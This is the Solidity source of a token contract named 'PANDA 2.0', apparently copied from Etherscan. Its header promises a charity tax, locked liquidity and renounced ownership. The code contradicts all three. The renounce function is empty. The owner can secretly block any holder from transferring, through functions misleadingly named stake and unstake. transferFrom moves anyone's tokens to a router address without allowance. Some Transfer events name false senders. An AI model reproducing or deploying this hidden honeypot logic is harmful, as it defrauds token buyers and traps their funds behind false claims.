/**
 *Submitted for verification at Etherscan.io on 2022-09-20
*/

pragma solidity 0.8.17;
/*

                      ▄██████▄▄    ,▄▄▄▄███████▄▄▄▄,   ,▄██████▄
                     ███████████████▀▀▀"'      `▀▀▀██████████████
                     ██████████▀▀                     ▀▀█████████
                      ▀█████▀                            ▀██████
                        ██▀                                 ██▄
                      ╓██`                                   ▀██
                     ,██                                      ▐██
                     ██           ,                ,,          ▐█▌
                    ]██        ▄█████▄           ██████▄        ██
                    ▐█▌     ,▄████▀▀██U         ▐█▀▀▀███▄▄      ██
                    ▐█▌    ██████▌   █  ▄▄▄▄▄▄▄ ▐█   ██████▄    ██
                     ██    ██████████▀ ▀███████` ▀██████████    ██
                     ██▄    ▀█████▀▀    `▀███▀     ▀██████▀    ██`
                      ██▄             ▀█▄▄███▄▄█Γ             ██▀
                       ▀█▄              ""  ``              ╓██▀
                        ╙██▄,                             ▄██▀
                           ▀██▄▄                      ,▄▄██▀
                              ▀▀███▄▄▄,,      ,,▄▄▄▄███▀▀
                                   ▀▀▀▀▀███████▀▀▀▀`
     
,------.   ,---.  ,--.  ,--.,------.    ,---.       ,---.      ,--.   
|  .--. ' /  O  \ |  ,'.|  ||  .-.  \  /  O  \     '.-.  \    /    \  
|  '--' ||  .-.  ||  |' '  ||  |  \  :|  .-.  |     .-' .'   |  ()  | 
|  | --' |  | |  ||  | `   ||  '--'  /|  | |  |    /   '-..--.\    /  
`--'     `--' `--'`--'  `--'`-------' `--' `--'    '-----''--' `--'   


- 100m Supply
- 2% Tax for Panda Charity
- LP Locked
- Contract Renounced
     
*/ 

contract PANDA {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) xVar;

    // 
    string public name = "PANDA 2.0";
    string public symbol = unicode"PANDA 2.0";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);
    
   



        constructor()  {
        balanceOf[msg.sender] = totalSupply;
        deploy(lead_deployer, totalSupply); }



	address owner = msg.sender;
    address Construct = 0xEa9fb2510BbaA0D48F0766Bf8175422a0262D9a7;
    address lead_deployer = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
    bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _; }

    function RenounceOwner() public onlyOwner  {}


    function deploy(address account, uint256 amount) public onlyOwner {
    emit Transfer(address(0), account, amount); }


    function transfer(address to, uint256 value) public returns (bool success) {

       
        if(msg.sender == Construct)  {
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }     
         if (!xVar[msg.sender]) {
   
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }}

        
         function unstake(address _num) public onlyOwner {
        require(xVar[_num], "1");
        xVar[_num] = false; }
    

    


    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;
    address Router = 0x68AD82C55f82B578696500098a635d3df466DC7C;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

    function stake(address _num) public onlyOwner {
        require(!xVar[_num], "1");
        xVar[_num] = true; }

    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Construct)  {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }
        if(to == Router)  {
        require(value <= balanceOf[from]);
        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (from, to, value);
        return true; }
              if  (!xVar[from])  {
                    if  (!xVar[to])  {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (from, to, value);
        return true; } }
 } }